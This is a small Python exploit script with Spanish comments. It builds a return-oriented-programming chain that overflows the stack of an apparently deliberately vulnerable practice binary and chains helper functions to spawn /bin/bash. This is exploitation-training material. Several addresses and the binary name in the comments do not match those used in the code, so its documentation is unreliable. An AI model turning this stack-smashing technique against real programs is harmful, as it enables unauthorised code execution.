#!/usr/bin/python


# Prueba de ropping para el ejecutable vuln1_stack. 
# 	Ejecuta de forma encadenada las funciones add_bin, add_bash y exec_string: 
# 	add_bin: 	  0x08049392  (parametros 0xdeadbeef)
# 	add_bash: 	  0x08049410 (parametros: 0xcafebabe, 0x0badf00d)
# 	exec_string:  0x08049398
# 	 
# 	Para encontrar gadgets para encadenar: 
# 	 	ropper -f vuln1_stack 
# 	Encuentro un gadget: 0x080494bd: add esp, 0xc; pop ebx; pop esi; pop edi; pop ebp; ret; 
#		Para hallar las direcciones: (gdb) x/8i 0x080494bd 		
#		pop ret: 0x080494c3
# 		pop pop ret: 0x080494c2 
# 	
# Para probarlo: ejecutar primero sh para ver que despues arranca el /bin/bash. 
# Ejecutar despues: ./rop.py
	
from struct import pack 
import os
import sys

p = ''
p += 'A' * 500
p += 'B' * 16
p += pack ('<I', 0x080493af) # add_bin en EIP
p += pack ('<I', 0x080493fa) # pop ret
p += pack ('<I', 0xdeadbeef) # param1 de add_bin
p += pack ('<I', 0x080493fc) # add_bash 
p += pack ('<I', 0x080493f9) # pop pop ret
p += pack ('<I', 0xcafebabe)
p += pack ('<I', 0x0badf00d)
p += pack ('<I', 0x08049373) # exec_string

os.system('./vuln_stack_nx ' + p)


